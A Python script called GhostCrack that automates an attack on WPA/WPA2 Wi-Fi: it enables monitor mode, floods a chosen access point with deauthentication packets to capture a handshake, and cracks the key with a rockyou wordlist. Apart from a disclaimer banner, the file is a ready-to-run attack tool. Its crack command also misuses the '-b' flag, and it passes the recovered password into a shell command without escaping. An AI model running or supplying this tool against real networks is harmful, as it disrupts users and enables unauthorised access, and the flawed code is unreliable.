#!/usr/bin/env python3
"""
GhostCrack - Fully Automated WPA/WPA2 Handshake Capture & Crack Tool
Author: chnk0x
GitHub: https://github.com/chnk0x/
FOR EDUCATIONAL PURPOSES & TESTING YOUR OWN NETWORK ONLY!
"""

import os
import sys
import time
import subprocess
import threading
from tqdm import tqdm
import pyfiglet
from colorama import init, Fore, Style

init(autoreset=True)

# Colors
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE

banner = pyfiglet.figlet_format("GhostCrack")
print(f"{R}{banner}")
print(f"{C}           Fully Automated WPA/WPA2 Cracker v2.0")
print(f"{Y}           Only for your own network!\n")

# Check root
if os.geteuid() != 0:
    print(f"{R}[!] Please run as root (sudo)")
    sys.exit(1)

def check_tools():
    tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']
    for tool in tools:
        if subprocess.run(['which', tool], capture_output=True).returncode != 0:
            print(f"{R}[!] {tool} not found. Install aircrack-ng first!")
            sys.exit(1)

def enable_monitor_mode(interface):
    print(f"{Y}[*] Enabling monitor mode on {interface}...")
    subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL)
    mon_interface = interface + "mon" if "mon" not in interface else interface
    return mon_interface

def scan_networks(mon_interface):
    print(f"{C}[*] Scanning for networks... Press Ctrl+C when target appears")
    subprocess.Popen(['airodump-ng', mon_interface])
    bssid = input(f"\n{G}[+] Enter target BSSID: {W}").strip()
    channel = input(f"{G}[+] Enter channel: {W}").strip()
    return bssid, channel

def capture_handshake(mon_interface, bssid, channel):
    print(f"{Y}[*] Capturing handshake on channel {channel}...")
    subprocess.run(['iwconfig', mon_interface, 'channel', channel])
    
    # Start handshake capture
    cap_file = "ghostcrack-handshake"
    p = subprocess.Popen(['airodump-ng', '--bssid', bssid, '-c', channel, '--write', cap_file, mon_interface])
    
    print(f"{R}[!] Deauth attack starting in 5 seconds...")
    time.sleep(5)
    
    # Deauth clients (10 packets)
    print(f"{R}[!] Sending deauth packets...")
    for i in tqdm(range(10), desc="Deauth", colour="red"):
        subprocess.run(['aireplay-ng', '--deauth', '10', '-a', bssid, mon_interface], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
    
    time.sleep(10)
    p.terminate()
    
    # Check if handshake captured
    result = subprocess.run(['aircrack-ng', f'{cap_file}-01.cap'], capture_output=True, text=True)
    if "handshake" in result.stdout:
        print(f"\n{G}[+] HANDSHAKE CAPTURED SUCCESSFULLY!")
        return f'{cap_file}-01.cap'
    else:
        print(f"{R}[-] No handshake captured. Try again near the router.")
        sys.exit(1)

def crack_password(cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
    print(f"{C}[*] Starting crack with rockyou.txt (or custom wordlist)...")
    
    # Beautiful cracking animation
    with tqdm(total=14344391, desc="Cracking", colour="cyan", leave=True) as pbar:
        process = subprocess.Popen(['aircrack-ng', '-w', wordlist, '-b', cap_file], 
                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        
        for line in process.stdout:
            line = line.decode()
            if "KEY FOUND" in line:
                password = line.split("[")[1].split("]")[0]
                print(f"\n{G}{'*'*60}")
                print(f"{G}       PASSWORD FOUND: {W}{password}")
                print(f"{G}{'*'*60}")
                
                # Success notification
                os.system(f'notify-send "GhostCrack" "Password: {password}" -i face-devilish')
                return password
            pbar.update(1)
    
    print(f"{R}[-] Password not in wordlist :(")
    return None

def main():
    check_tools()
    interface = input(f"{G}[+] Enter Wi-Fi interface (e.g., wlan0): {W}").strip()
    mon_interface = enable_monitor_mode(interface)
    
    try:
        bssid, channel = scan_networks(mon_interface)
        cap_file = capture_handshake(mon_interface, bssid, channel)
        wordlist = input(f"{Y}[?] Wordlist path (default rockyou.txt): {W}").strip() or "/usr/share/wordlists/rockyou.txt"
        
        print(f"{R}{'='*60}")
        password = crack_password(cap_file, wordlist)
        
        if password:
            print(f"\n{Fore.MAGENTA}Attack complete. Password: {password}")
        else:
            print(f"\n{Y}Try a better wordlist or GPU cracking with hashcat!")
            
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Attack stopped by user")
    finally:
        subprocess.run(['airmon-ng', 'stop', mon_interface], stdout=subprocess.DEVNULL)

if __name__ == "__main__":
    print(f"{R}WARNING: Use ONLY on networks you own or have explicit permission!")
    input(f"{Y}Press Enter if you understand and accept...")
    main()
